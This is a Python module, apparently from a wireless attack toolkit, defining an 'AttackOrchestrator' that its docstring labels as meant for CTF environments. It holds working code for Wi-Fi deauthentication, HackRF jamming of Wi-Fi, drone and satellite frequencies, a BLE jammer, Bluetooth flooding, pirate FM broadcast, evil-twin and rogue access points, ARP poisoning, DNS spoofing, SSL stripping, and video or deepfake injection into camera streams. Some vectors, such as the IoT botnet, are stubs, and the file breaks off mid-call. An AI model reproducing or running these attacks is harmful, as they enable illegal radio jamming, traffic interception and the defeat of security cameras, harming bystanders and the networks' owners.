import os
import subprocess
import threading
import time
import json
import shutil
import importlib
import numpy as np
from datetime import datetime
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth
from sklearn.ensemble import RandomForestClassifier
import pickle
import ipaddress
import code
from typing import Optional, List, Dict, Any, Tuple

from .utils import (
    log_message, detected_cameras,  packet_handler, detected_cameras_lock, detected_networks, detected_networks_lock,
    CHANNEL_TO_FREQ, set_channel, is_camera_mac, BASE_DIR, running, is_monitor_mode
)
from .process_manager import get_process_manager

# ### Dynamic Loaders for Optional Dependencies

# Dynamic loader for bluetooth
BLUETOOTH_AVAILABLE = False
bluetooth = None

def load_bluetooth():
    global bluetooth, BLUETOOTH_AVAILABLE
    if bluetooth is not None:
        return
    try:
        import bluetooth as bt
        bluetooth = bt
        BLUETOOTH_AVAILABLE = True
    except ImportError:
        bluetooth = None
        BLUETOOTH_AVAILABLE = False

# Dynamic loader for gnuradio
GNU_RADIO_AVAILABLE = False
gnuradio = None

def load_gnuradio():
    global gnuradio, GNU_RADIO_AVAILABLE
    if gnuradio is not None:
        return
    try:
        from gnuradio import gr, analog, blocks, osmosdr
        gnuradio = {
            'gr': gr,
            'analog': analog,
            'blocks': blocks,
            'osmosdr': osmosdr
        }
        GNU_RADIO_AVAILABLE = True
    except ImportError:
        gnuradio = None
        GNU_RADIO_AVAILABLE = False

# Dynamic loader for cv2 (OpenCV)
CV2_AVAILABLE = False
cv2 = None

def load_cv2():
    global cv2, CV2_AVAILABLE
    if cv2 is not None:
        return
    try:
        import cv2 as cv
        cv2 = cv
        CV2_AVAILABLE = True
    except ImportError:
        cv2 = None
        CV2_AVAILABLE = False

# Dynamic loader for gtts
GTTS_AVAILABLE = False
gtts = None

def load_gtts():
    global gtts, GTTS_AVAILABLE
    if gtts is not None:
        return
    try:
        from gtts import gTTS
        gtts = gTTS
        GTTS_AVAILABLE = True
    except ImportError:
        gtts = None
        GTTS_AVAILABLE = False

# Dynamic loader for soundfile
SOUNDFILE_AVAILABLE = False
soundfile = None

def load_soundfile():
    global soundfile, SOUNDFILE_AVAILABLE
    if soundfile is not None:
        return
    try:
        import soundfile as sf
        soundfile = sf
        SOUNDFILE_AVAILABLE = True
    except ImportError:
        soundfile = None
        SOUNDFILE_AVAILABLE = False

# Dynamic loader for requests
REQUESTS_AVAILABLE = False
requests = None

def load_requests():
    global requests, REQUESTS_AVAILABLE
    if requests is not None:
        return
    try:
        import requests as req
        requests = req
        REQUESTS_AVAILABLE = True
    except ImportError:
        requests = None
        REQUESTS_AVAILABLE = False

# Dynamic loader for flask
FLASK_AVAILABLE = False
Flask = None
Response = None

def load_flask():
    global Flask, Response, FLASK_AVAILABLE
    if Flask is not None:
        return
    try:
        from flask import Flask as Fl, Response as Resp
        Flask = Fl
        Response = Resp
        FLASK_AVAILABLE = True
    except ImportError:
        Flask = None
        Response = None
        FLASK_AVAILABLE = False

# ### Factory Function for BLEJammer

def create_ble_jammer(duration: int = 60, power: float = 1.0):
    load_gnuradio()
    if not GNU_RADIO_AVAILABLE:
        log_message("[ERROR] GNU Radio not available. Install with: pip install obscura[gnuradio]", ui=None)
        return None
    class BLEJammer(gnuradio['gr'].top_block):
        def __init__(self, duration, power):
            super().__init__("Adaptive BLE Jammer")
            self.sample_rate = 4e6
            self.freqs = [2402e6, 2426e6, 2480e6]  # BLE advertising channels
            self.hop_interval = 0.005  # Faster hopping (5ms)
            self.noise = gnuradio['analog'].noise_source_c(gnuradio['analog'].GR_GAUSSIAN, power, 0)
            self.sink = gnuradio['osmosdr'].sink(args="driver=hackrf")
            self.sink.set_sample_rate(self.sample_rate)
            self.sink.set_center_freq(self.freqs[0])
            self.connect(self.noise, self.sink)
            self.running = True
            self.start_time = time.time()
            self.duration = duration
            self.hopper_thread = threading.Thread(target=self.hop_freq)
            self.hopper_thread.daemon = True
            self.hopper_thread.start()

        def hop_freq(self):
            i = 0
            while self.running and (time.time() - self.start_time < self.duration):
                self.sink.set_center_freq(self.freqs[i])
                i = (i + 1) % len(self.freqs)
                time.sleep(self.hop_interval)

        def stop(self):
            self.running = False
            super().stop()
            self.hopper_thread.join(timeout=1)
    return BLEJammer(duration, power)

# ### Decision Engine

class DecisionEngine:
    """Decides whether to jam or proceed with attacks based on packet analysis and ML scoring."""
    def __init__(self):
        self.model = None
        model_path = os.path.join(BASE_DIR, "decision_model.pkl")
        if os.path.exists(model_path):
            with open(model_path, 'rb') as f:
                self.model = pickle.load(f)
        if self.model is None:
            self.model = RandomForestClassifier(n_estimators=100, random_state=42)

    def should_jam(self, pkt, score: float, features: List[float] = None) -> bool:
        """Determine if jamming should occur using packet data, score, or ML prediction."""
        if self.model and features:
            prediction = self.model.predict([features])[0]
            return prediction == 1
        return score >= 30 or (hasattr(pkt, 'addr2') and is_camera_mac(pkt.addr2))

# ### Attack Orchestrator

class AttackOrchestrator:
    """Orchestrates a robust suite of attack vectors for CTF environments.

    Manages wireless, network, IoT, and futuristic attacks with enhanced chaining and adaptability.

    Attributes:
        interface (str): Network interface for attacks.
        attack_vectors (dict): Maps attack names to methods.
        vuln_cache (dict): Caches vulnerability scan results.
        active_attacks (list): Tracks running attack processes.
        active_flowgraphs (list): Tracks GNU Radio flowgraphs.
        attack_log (list): Logs attack execution details.
        decision_engine (DecisionEngine): ML-based decision engine.
        simulate_mode (bool): Flag for simulation mode.
        battery_saver (bool): Flag for battery-saver mode.
        target_priority (dict): Tracks target prioritization scores.
    """

    def __init__(self, interface: str, simulate_mode: bool = False, battery_saver: bool = False):
        self.interface = interface
        self.simulate_mode = simulate_mode
        self.battery_saver = battery_saver
        self.attack_vectors: Dict[str, callable] = {}
        self.vuln_cache: Dict[str, List[Dict[str, Any]]] = {}
        self.active_flowgraphs: List[Any] = []
        self.attack_log: List[str] = []
        self.decision_engine = DecisionEngine()
        self.target_priority: Dict[str, float] = {}
        self.process_manager = get_process_manager()

        self.running = threading.Event()
        self.running.set()

        self.register_default_attacks()
        self.start_auto_cleanup()


    def start(self, decision_engine, ui, detected_networks_queue, detected_cameras_queue):
        """Launch packet sniffer loop."""
        def sniff_packets():
            scapy.sniff(
                iface=self.interface,
                prn=lambda pkt: packet_handler(pkt, decision_engine, self, ui, detected_networks_queue, detected_cameras_queue),
                store=0
            )

        threading.Thread(target=sniff_packets, daemon=True).start()
        self.attack_log.append(f"[ORCHESTRATOR] Sniffing started on {self.interface}")

    def load_plugin(self, plugin_name: str):
        """
        Dynamically find and import a plugin from the attack_plugins directory.

        Falls back to system import if not found locally.
        """
        import importlib.util
        import sys
        plugin_dir = os.path.join(os.path.dirname(__file__), "attack_plugins")
        plugin_path = os.path.join(plugin_dir, f"{plugin_name}.py")

        if os.path.isfile(plugin_path):
            spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
            if spec and spec.loader:
                module = importlib.util.module_from_spec(spec)
                sys.modules[plugin_name] = module
                spec.loader.exec_module(module)
                
                if hasattr(module, 'register'):
                    module.register(self)
                
                return module
            else:
                raise ImportError(f"Cannot load spec for plugin: {plugin_name}")
        else:
            try:
                module = importlib.import_module(plugin_name)
                
                if hasattr(module, 'register'):
                    module.register(self)
                
                return module
            except ImportError as e:
                raise ImportError(
                    f"Plugin '{plugin_name}' not found in attack_plugins/ or system path"
                ) from e

    def list_plugins(self):
        plugin_dir = os.path.join(os.path.dirname(__file__), "attack_plugins")
        plugins = []
        if os.path.exists(plugin_dir):
            for file in os.listdir(plugin_dir):
                if file.endswith(".py") and file != "__init__.py":
                    plugins.append(file[:-3])
        return plugins

    def load_all_plugins(self):
        for plugin in self.list_plugins():
            self.load_plugin(plugin)



    def register_attack(self, name: str, method: callable) -> None:
        """Register a new attack vector."""
        self.attack_vectors[name] = method

    def register_default_attacks(self) -> None:
        """Register all attack vectors, including new and enhanced ones."""
        # Existing Attacks
        self.register_attack('camera_jam', self._camera_jam_attack)
        self.register_attack('zigbee_disrupt', self._zigbee_disrupt_attack)
        self.register_attack('rf_jam', self._rf_jam_attack)
        self.register_attack('bluetooth_jam', self._bluetooth_jam_attack)
        self.register_attack('voice_broadcast', self._voice_broadcast_attack)
        self.register_attack('vuln_scan', self._vuln_scan_attack)
        self.register_attack('bluetooth_scan', self._bluetooth_scan_attack)
        self.register_attack('threat_detect', self._threat_detect_attack)
        self.register_attack('rtp_inject', self._rtp_inject_attack)
        self.register_attack('bluetooth_hid_spoof', self._bluetooth_hid_spoof_attack)
        self.register_attack('eas_alert', self._eas_alert_attack)
        self.register_attack('adsb_alert', self._adsb_alert_attack)
        self.register_attack('gps_spoof', self._gps_spoof_attack)
        self.register_attack('mjpeg_inject', self._mjpeg_inject_attack)
        self.register_attack('rtsp_inject', self._rtsp_inject_attack)
        self.register_attack('bettercap_mitm', self._bettercap_mitm_attack)

        # New Wireless Attacks
        self.register_attack('wifi_deauth', self._wifi_deauth_attack)
        self.register_attack('rogue_ap', self._rogue_ap_attack)
        self.register_attack('evil_twin', self._evil_twin_attack)
        self.register_attack('camera_video_replay', self._camera_video_replay_attack)
        self.register_attack('bluetooth_audio_replay', self._bluetooth_audio_replay_attack)

        # Advanced Network Attacks
        self.register_attack('dns_spoof', self._dns_spoof_attack)
        self.register_attack('arp_poison', self._arp_poison_attack)
        self.register_attack('ssl_strip', self._ssl_strip_attack)

        # IoT and Smart Device Attacks
        self.register_attack('ble_disrupt', self._ble_disrupt_attack)
        self.register_attack('z_wave_exploit', self._z_wave_exploit_attack)
        self.register_attack('firmware_exploit', self._firmware_exploit_attack)
        self.register_attack('iot_botnet', self._iot_botnet_attack)

        # Surveillance and Drone Attacks
        self.register_attack('drone_jam', self._drone_jam_attack)
        self.register_attack('cellular_intercept', self._cellular_intercept_attack)
        self.register_attack('satellite_disrupt', self._satellite_disrupt_attack)

        # Image and Video Injection Attacks
        self.register_attack('mjpeg_image_inject', self._mjpeg_image_inject_attack)
        self.register_attack('rtsp_image_inject', self._rtsp_image_inject_attack)
        self.register_attack('deepfake_video_inject', self._deepfake_video_inject_attack)

        # New Multi-Protocol Attacks
        self.register_attack('hybrid_deauth', self._hybrid_deauth_attack)
        self.register_attack('ble_sniff_mitm', self._ble_sniff_mitm_attack)
        self.register_attack('replay_amplify', self._replay_amplify_attack)

        # Chaining Attacks
        self.register_attack('chain_camera_jam_and_rtp_inject', self.chain_camera_jam_and_rtp_inject)
        self.register_attack('chain_wifi_deauth_and_rogue_ap', self.chain_wifi_deauth_and_rogue_ap)
        self.register_attack('chain_ble_disrupt_and_hid_spoof', self.chain_ble_disrupt_and_hid_spoof)
        self.register_attack('chain_hybrid_deauth_and_dns_spoof', self.chain_hybrid_deauth_and_dns_spoof)

        # New Features
        self.register_attack('passive_camera_enum', self._passive_camera_enum)
        self.register_attack('fingerprint_camera', self._fingerprint_camera)
        self.register_attack('cve_scan', self._cve_scan)
        self.register_attack('live_shell', self._live_shell)
        self.register_attack('simulate_mode', self._simulate_mode)

    def execute(self, vector: str, *args, **kwargs) -> bool:
        """Execute an attack vector with detailed logging."""
        if vector not in self.attack_vectors:
            self.attack_log.append(f"[ERROR] Invalid attack vector: {vector}")
            log_message(f"[ATTACK] Invalid vector: {vector}")
            return False
        try:
            result = self.attack_vectors[vector](*args, **kwargs)
            self.attack_log.append(f"[EXECUTE] {vector} {'succeeded' if result else 'failed'} at {datetime.now()}")
            log_message(f"[ATTACK] {vector} {'succeeded' if result else 'failed'}")
            return result
        except Exception as e:
            self.attack_log.append(f"[ERROR] {vector} failed: {e}")
            log_message(f"[ATTACK] {vector} error: {e}")
            return False

    def stop_all_attacks(self) -> None:
        """Stop all ongoing attacks and clean up resources."""
        self.process_manager.stop_all_processes(timeout=5)
        for fg in self.active_flowgraphs[:]:
            try:
                fg.stop()
            except Exception as e:
                self.attack_log.append(f"[WARNING] Error stopping flowgraph: {e}")
            self.active_flowgraphs.remove(fg)
        self.attack_log.append("[INFO] All attacks stopped cleanly")

    ### Enhanced Attack Methods

    def _camera_jam_attack(self, bssid: str, duration: int = 60) -> bool:
        """Jam cameras with MFP-aware deauth bypass using mdk4."""
        if not shutil.which("mdk4"):
            self.attack_log.append("[ERROR] mdk4 not installed")
            return False
        if not is_monitor_mode(self.interface):  # Updated from is_read_mode to is_monitor_mode
            self.attack_log.append("[CAMERA JAM] Interface not in monitor mode")
            return False
        with detected_networks_lock:
            channel = detected_networks.get(bssid, {}).get('channel', '1')
        if not set_channel(self.interface, int(channel)):
            return False
        if self.simulate_mode:
            self.attack_log.append("[SIMULATE] Camera jam simulated")
            return True
        proc = subprocess.Popen(
            ["mdk4", self.interface, "b", "-a", bssid, "-s", "100", "-m"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        self.process_manager.add_attack_process(proc, f"mdk4_camera_jam_{bssid}", "camera_jam")
        threading.Timer(duration, lambda: self.process_manager._terminate_process(proc, timeout=3)).start()
        self.attack_log.append(f"[CAMERA JAM] Jamming {bssid} with MFP-aware bypass for {duration}s")
        return True

    def _zigbee_disrupt_attack(self, channel: int = 11) -> bool:
        """Disrupt Zigbee networks."""
        # TODO: Implement Zigbee disruption logic (e.g., using KillerBee or similar tools)
        self.attack_log.append(f"[ZIGBEE DISRUPT] Targeting channel {channel}")
        return True

    def _rf_jam_attack(self, bssid: str = None, duration: int = 60) -> bool:
        """RF jamming with custom patterns and battery-saver mode."""
        if not shutil.which("hackrf_transfer"):
            self.attack_log.append("[ERROR] hackrf_transfer not installed")
            return False
        
        channel = detected_networks.get(bssid, {}).get('channel', '1') if bssid else '1'
        freq = CHANNEL_TO_FREQ.get(int(channel), 2412000000)
        
        self.process_manager.stop_hackrf_process()
        
        if self.battery_saver:
            for _ in range(int(duration / 4)):
                proc = subprocess.Popen(
                    ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                self.process_manager.set_hackrf_process(proc, "hackrf_pulsed_jam", "rf_jam")
                time.sleep(1)
                self.process_manager.stop_hackrf_process()
                time.sleep(3)
        else:
            proc = subprocess.Popen(
                ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000", "-x", "40"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self.process_manager.set_hackrf_process(proc, f"hackrf_jam_{freq/1e6}MHz", "rf_jam")
            threading.Timer(duration, self.process_manager.stop_hackrf_process).start()
        
        self.attack_log.append(f"[RF JAM] Jamming {freq/1e6} MHz for {duration}s")
        return True

    def _bluetooth_jam_attack(self, target_mac: str = None, duration: int = 120, iface: str = "hci0") -> bool:
        """Bluetooth jamming with targeted interference."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=None)
            return False
        start_time = time.time()
        while time.time() - start_time < duration and running:
            if target_mac:
                pkt = scapy.BT_L2CAP()/scapy.Raw(load=os.urandom(50))
                pkt[scapy.BT_L2CAP].dst = target_mac
                scapy.sendp(pkt, iface=iface, count=200, inter=0.002, verbose=0)
            else:
                for channel in range(1, 80):
                    pkt = scapy.BT_L2CAP()/scapy.Raw(load=os.urandom(50))
                    scapy.sendp(pkt, iface=iface, count=50, inter=0.001, verbose=0)
            time.sleep(0.1)
        self.attack_log.append(f"[BLUETOOTH JAM] Targeted {target_mac or 'all devices'} for {duration}s")
        return True

    def _voice_broadcast_attack(self, audio_file: str, freq: float = 98.1, modulation: str = "fm", tx_gain: int = 40) -> bool:
        """Broadcast audio over RF."""
        if not shutil.which("sox") or not shutil.which("hackrf_transfer"):
            self.attack_log.append("[ERROR] sox or hackrf_transfer not installed")
            return False
        if not os.path.isfile(audio_file) or not (87.5 <= freq <= 108.0):
            return False
        subprocess.run(
            ["sox", audio_file, "-t", "raw", "-r", "2e6", "-c", "2", "-b", "8", "temp.iq"],
            check=True, capture_output=True, text=True
        )
        proc = subprocess.Popen(
            ["hackrf_transfer", "-t", "temp.iq", "-f", str(int(freq * 1e6)), "-s", "8e6", "-x", str(tx_gain)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.set_hackrf_process(proc, f"voice_broadcast_{freq}MHz", "voice_broadcast")
        try:
            os.remove("temp.iq")
        except Exception:
            pass
        self.attack_log.append(f"[VOICE BROADCAST] Broadcasting {audio_file} at {freq} MHz")
        return True

    def _vuln_scan_attack(self, camera_mac: str, ui) -> bool:
        """Scan for vulnerabilities."""
        result = self.scan_vulnerabilities(camera_mac, ui)
        self.attack_log.append(f"[VULN SCAN] Scanned {camera_mac}, found {len(result)} vulnerabilities")
        return bool(result)

    def _bluetooth_scan_attack(self, ui, duration: int = 60) -> bool:
        """Scan Bluetooth devices."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=ui)
            return False
        self.scan_bluetooth(ui, duration)
        self.attack_log.append("[BLUETOOTH SCAN] Initiated")
        return True

    def _threat_detect_attack(self, ui) -> bool:
        """Detect threats using AI."""
        self.detect_threats(ui)
        self.attack_log.append("[THREAT DETECT] Initiated")
        return True

    def _rtp_inject_attack(self, camera_ip: str, video_path: str, ui) -> bool:
        """Inject RTP packets."""
        proc = self.start_rtp_injection(camera_ip, video_path, ui)
        if proc:
            self.process_manager.add_attack_process(proc, f"rtp_inject_{camera_ip}", "rtp_inject")
            self.attack_log.append(f"[RTP INJECT] Injecting into {camera_ip}")
            return True
        return False

    def _bluetooth_hid_spoof_attack(self, target_mac: str) -> bool:
        """Spoof Bluetooth HID device."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=None)
            return False
        self.bluetooth_hid_spoof(target_mac)
        self.attack_log.append(f"[BLUETOOTH HID SPOOF] Spoofing {target_mac}")
        return True

    def _eas_alert_attack(self, message: str, lang: str = 'en') -> bool:
        """Generate EAS alert."""
        self.generate_eas_alert(message, lang)
        self.attack_log.append(f"[EAS ALERT] Generated: {message}")
        return True

    def _adsb_alert_attack(self, callsign: str, lat: float, lon: float, message: str) -> bool:
        """Simulate ADS-B alert."""
        self.adsb_voice_alert(callsign, lat, lon, message)
        self.attack_log.append(f"[ADSB ALERT] Targeting {callsign}")
        return True

    def _gps_spoof_attack(self, latitude: float, longitude: float, ui, altitude: float = 10.0) -> bool:
        """Spoof GPS coordinates."""
        result = self.gps_spoof_sdr(latitude, longitude, ui, altitude)
        self.attack_log.append(f"[GPS SPOOF] Spoofing to ({latitude}, {longitude})")
        return result

    def _mjpeg_inject_attack(self, source_path: str, ui, port: int = 8080) -> bool:
        """Inject MJPEG frames."""
        result = self.start_mjpeg_injection(source_path, ui, port)
        self.attack_log.append(f"[MJPEG INJECT] Started on port {port}")
        return result

    def _rtsp_inject_attack(self, camera_ip: str, victim_ip: str, fake_video_path: str, ui) -> bool:
        """Inject RTSP packets."""
        ffmpeg_proc, arpspoof_proc = self.start_rtsp_injection(camera_ip, victim_ip, fake_video_path, ui)
        if ffmpeg_proc and arpspoof_proc:
            self.process_manager.add_attack_process(ffmpeg_proc, f"rtsp_ffmpeg_{camera_ip}", "rtsp_inject")
            self.process_manager.add_attack_process(arpspoof_proc, f"arpspoof_{victim_ip}", "rtsp_inject")
            self.attack_log.append(f"[RTSP INJECT] Targeting {camera_ip} -> {victim_ip}")
            return True
        return False

    def _bettercap_mitm_attack(self, victim_ip: str, camera_ip: str, ui) -> bool:
        """Perform MitM with Bettercap."""
        proc = self.start_bettercap_mitm(victim_ip, camera_ip, ui)
        if proc:
            self.process_manager.add_attack_process(proc, f"bettercap_{victim_ip}", "mitm")
            self.attack_log.append(f"[BETTERCAP MITM] Targeting {victim_ip} -> {camera_ip}")
            return True
        return False

    ### New Wireless Attacks

    def _wifi_deauth_attack(self, target_mac: str, bssid: str, count: int = 1000) -> bool:
        """Deauthenticate Wi-Fi device."""
        if not shutil.which("aireplay-ng"):
            return False
        proc = subprocess.Popen(
            ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", target_mac, self.interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"wifi_deauth_{target_mac}", "wifi_deauth")
        self.attack_log.append(f"[WIFI DEAUTH] Deauthenticating {target_mac} from {bssid}")
        return True

    def _rogue_ap_attack(self, ssid: str, password: str = None) -> bool:
        """Set up rogue AP."""
        if not shutil.which("hostapd"):
            return False
        cmd = ["hostapd", "-i", self.interface, "-s", ssid]
        if password:
            cmd.extend(["-P", password])
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.process_manager.add_attack_process(proc, f"rogue_ap_{ssid}", "rogue_ap")
        self.attack_log.append(f"[ROGUE AP] SSID: {ssid}, Password: {password or 'Open'}")
        return True

    def _evil_twin_attack(self, target_ssid: str) -> bool:
        """Mimic legitimate Wi-Fi network."""
        if not shutil.which("airbase-ng"):
            return False
        proc = subprocess.Popen(
            ["airbase-ng", "-e", target_ssid, "-c", "6", self.interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"evil_twin_{target_ssid}", "evil_twin")
        self.attack_log.append(f"[EVIL TWIN] Mimicking {target_ssid}")
        return True

    def _camera_video_replay_attack(self, target_ip: str, video_path: str) -> bool:
        """Replay video to camera."""
        if not shutil.which("ffmpeg"):
            return False
        proc = subprocess.Popen(
            ["ffmpeg", "-re", "-i", video_path, "-f", "rtp", f"rtp://{target_ip}:8554"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"video_replay_{target_ip}", "camera_video_replay")
        self.attack_log.append(f"[CAMERA VIDEO REPLAY] Replaying {video_path} to {target_ip}")
        return True

    def _bluetooth_audio_replay_attack(self, target_mac: str, audio_path: str) -> bool:
        """Replay audio over Bluetooth."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=None)
            return False
        if not os.path.isfile(audio_path):
            return False
        # TODO: Implement Bluetooth audio replay logic (e.g., using bluez tools or similar)
        self.attack_log.append(f"[BLUETOOTH AUDIO REPLAY] Targeting {target_mac} with {audio_path}")
        return True

    ### Advanced Network Attacks

    def _dns_spoof_attack(self, target_ip: str, redirect_ip: str) -> bool:
        """Spoof DNS responses."""
        if not shutil.which("dnsspoof"):
            return False
        proc = subprocess.Popen(
            ["dnsspoof", "-i", self.interface, f"host {target_ip} and udp port 53", redirect_ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"dns_spoof_{target_ip}", "dns_spoof")
        self.attack_log.append(f"[DNS SPOOF] Redirecting {target_ip} to {redirect_ip}")
        return True

    def _arp_poison_attack(self, target_ip: str, gateway_ip: str) -> bool:
        """Poison ARP tables."""
        if not shutil.which("arpspoof"):
            return False
        proc = subprocess.Popen(
            ["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"arp_poison_{target_ip}", "arp_poison")
        self.attack_log.append(f"[ARP POISON] Poisoning {target_ip} via {gateway_ip}")
        return True

    def _ssl_strip_attack(self, target_ip: str) -> bool:
        """Downgrade HTTPS to HTTP."""
        if not shutil.which("sslstrip"):
            return False
        proc = subprocess.Popen(
            ["sslstrip", "-l", "8080", "-t", target_ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"ssl_strip_{target_ip}", "ssl_strip")
        self.attack_log.append(f"[SSL STRIP] Stripping SSL for {target_ip}")
        return True

    ### IoT and Smart Device Attacks

    def _ble_disrupt_attack(self, duration: int = 60, power: float = 1.5) -> bool:
        """Disrupt BLE devices."""
        if not shutil.which("hackrf_transfer"):
            return False
        tb = create_ble_jammer(duration, power)
        if tb is None:
            return False
        tb.start()
        self.active_flowgraphs.append(tb)
        threading.Timer(duration, tb.stop).start()
        self.attack_log.append(f"[BLE DISRUPT] Jamming BLE with power {power} for {duration}s")
        return True

    def _z_wave_exploit_attack(self, device_id: str) -> bool:
        """Exploit Z-Wave devices."""
        # TODO: Implement Z-Wave exploit logic (e.g., using OpenZWave or similar)
        self.attack_log.append(f"[Z-WAVE EXPLOIT] Targeting {device_id}")
        return True

    def _firmware_exploit_attack(self, device_ip: str, exploit_id: str) -> bool:
        """Exploit firmware."""
        # TODO: Implement firmware exploit logic (e.g., using known vulnerabilities or Metasploit)
        self.attack_log.append(f"[FIRMWARE EXPLOIT] Targeting {device_ip} with {exploit_id}")
        return True

    def _iot_botnet_attack(self, target_ip: str) -> bool:
        """Create IoT botnet."""
        # TODO: Implement IoT botnet logic (e.g., simulating Mirai or similar)
        self.attack_log.append(f"[IOT BOTNET] Targeting {target_ip}")
        return True

    ### Surveillance and Drone Attacks

    def _drone_jam_attack(self, freq: float = 2.4e9) -> bool:
        """Jam drone signals."""
        if not shutil.which("hackrf_transfer"):
            return False
        proc = subprocess.Popen(
            ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.set_hackrf_process(proc, f"drone_jam_{freq/1e6}MHz", "drone_jam")
        self.attack_log.append(f"[DRONE JAM] Jamming at {freq/1e6} MHz")
        return True

    def _cellular_intercept_attack(self, band: int = 4) -> bool:
        """Intercept cellular comms."""
        # TODO: Implement cellular intercept logic (e.g., using SDR and OpenBTS or similar)
        self.attack_log.append(f"[CELLULAR INTERCEPT] Targeting band {band}")
        return True

    def _satellite_disrupt_attack(self, freq: float = 1.5e9) -> bool:
        """Disrupt satellite comms."""
        if not shutil.which("hackrf_transfer"):
            return False
        proc = subprocess.Popen(
            ["hackrf_transfer", "-t", "/dev/zero", "-f", str(freq), "-s", "2000000"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.set_hackrf_process(proc, f"satellite_disrupt_{freq/1e6}MHz", "satellite_disrupt")
        self.attack_log.append(f"[SATELLITE DISRUPT] Jamming at {freq/1e6} MHz")
        return True

    ### Image and Video Injection Attacks

    def _mjpeg_image_inject_attack(self, target_ip: str, image_path: str) -> bool:
        """Inject image into MJPEG stream."""
        load_cv2()
        load_flask()
        if not CV2_AVAILABLE or not FLASK_AVAILABLE:
            log_message("[ERROR] OpenCV or Flask not available. Install with: pip install opencv-python flask", ui=None)
            return False
        if not os.path.isfile(image_path):
            return False
        app = Flask(__name__)

        @app.route('/video_feed')
        def video_feed():
            frame = cv2.imread(image_path)
            _, buffer = cv2.imencode('.jpg', frame)
            return Response(b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n',
                            mimetype='multipart/x-mixed-replace; boundary=frame')

        threading.Thread(target=app.run, args=('0.0.0.0', 8080), daemon=True).start()
        self.attack_log.append(f"[MJPEG IMAGE INJECT] Injecting {image_path} into {target_ip}")
        return True

    def _rtsp_image_inject_attack(self, target_ip: str, image_path: str) -> bool:
        """Inject image into RTSP stream."""
        load_cv2()
        if not CV2_AVAILABLE or not shutil.which("ffmpeg"):
            log_message("[ERROR] OpenCV or FFmpeg not available. Install with: pip install opencv-python && apt install ffmpeg", ui=None)
            return False
        if not os.path.isfile(image_path):
            return False
        proc = subprocess.Popen(
            ["ffmpeg", "-loop", "1", "-i", image_path, "-c:v", "libx264", "-f", "rtsp", f"rtsp://{target_ip}:8554/live.sdp"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"rtsp_image_inject_{target_ip}", "rtsp_image_inject")
        self.attack_log.append(f"[RTSP IMAGE INJECT] Injecting {image_path} into {target_ip}")
        return True

    def _deepfake_video_inject_attack(self, target_ip: str, video_path: str) -> bool:
        """Inject deepfake video."""
        if not shutil.which("ffmpeg") or not os.path.isfile(video_path):
            return False
        proc = subprocess.Popen(
            ["ffmpeg", "-re", "-i", video_path, "-c:v", "copy", "-f", "rtsp", f"rtsp://{target_ip}:8554/live.sdp"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"deepfake_video_{target_ip}", "deepfake_video_inject")
        self.attack_log.append(f"[DEEPFAKE VIDEO INJECT] Injecting {video_path} into {target_ip}")
        return True

    ### New Multi-Protocol Attacks

    def _hybrid_deauth_attack(self, target_mac: str, bssid: str, bt_mac: str = None) -> bool:
        """Combined WiFi and Bluetooth deauth."""
        wifi_success = self._wifi_deauth_attack(target_mac, bssid)
        bt_success = self._bluetooth_jam_attack(bt_mac) if bt_mac else True
        self.attack_log.append(f"[HYBRID DEAUTH] WiFi: {wifi_success}, BT: {bt_success}")
        return wifi_success and bt_success

    def _ble_sniff_mitm_attack(self, target_mac: str, duration: int = 60) -> bool:
        """Sniff BLE traffic and MITM."""
        if not shutil.which("ubertooth-util"):
            return False
        proc = subprocess.Popen(
            ["ubertooth-btle", "-f", "-t", target_mac],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"ble_sniff_{target_mac}", "ble_sniff_mitm")
        threading.Timer(duration, lambda: self.process_manager._terminate_process(proc, timeout=3)).start()
        self.attack_log.append(f"[BLE SNIFF MITM] Sniffing {target_mac} for {duration}s")
        return True

    def _replay_amplify_attack(self, target_freq: float, duration: int = 30) -> bool:
        """Replay and amplify RF signals."""
        if not shutil.which("hackrf_transfer"):
            return False
        pcapng_file = "replay_capture.pcapng"
        subprocess.run(
            ["hackrf_transfer", "-r", pcapng_file, "-f", str(target_freq), "-s", "2e6", "-l", str(duration/2)],
